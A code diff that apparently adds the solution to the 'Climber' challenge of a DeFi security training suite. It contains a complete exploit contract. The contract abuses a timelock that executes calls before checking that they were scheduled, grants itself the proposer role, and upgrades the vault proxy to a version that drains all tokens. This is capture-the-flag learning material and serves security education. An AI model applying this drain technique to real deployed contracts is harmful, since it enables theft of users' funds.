@@ -7,6 +7,56 @@ import {ClimberVault} from "../../src/climber/ClimberVault.sol";
 import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+contract NewClimberVault is ClimberVault {
+    function initializeV2(address token, address recovery) external {
+        SafeTransferLib.safeTransfer(token, recovery, IERC20(token).balanceOf(address(this)));
+    }
+}
+
+contract Rescuer {
+    ClimberTimelock timelock;
+    uint256 constant len = 4;
+    address[] targets;
+    uint256[] values;
+    bytes[] dataElements;
+    bytes32 constant salt = "";
+
+    constructor(ClimberTimelock timelock_, ClimberVault vault, address token, address recovery) {
+        NewClimberVault newVault = new NewClimberVault();
+
+        timelock = timelock_;
+
+        targets = new address[](len);
+        values = new uint256[](len);
+        dataElements = new bytes[](len);
+
+        targets[0] = address(timelock);
+        dataElements[0] = abi.encodeWithSelector(timelock.updateDelay.selector, 0);
+
+        targets[1] = address(timelock);
+        dataElements[1] = abi.encodeWithSelector(timelock.grantRole.selector, PROPOSER_ROLE, address(this));
+
+        targets[2] = address(this);
+        dataElements[2] = abi.encodeWithSignature("scheduleOnTimelock()");
+
+        targets[3] = address(vault);
+        dataElements[3] = abi.encodeWithSelector(
+            vault.upgradeToAndCall.selector,
+            address(newVault), abi.encodeWithSelector(newVault.initializeV2.selector, token, recovery)
+        );
+    }
+
+    function rescue() external {
+        timelock.execute(targets, values, dataElements, salt);
+    }
+
+    function scheduleOnTimelock() external {
+        timelock.schedule(targets, values, dataElements, salt);
+    }
+}
 
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -85,7 +135,8 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        Rescuer r = new Rescuer(timelock, vault, address(token), recovery);
+        r.rescue();
     }
 
     /**
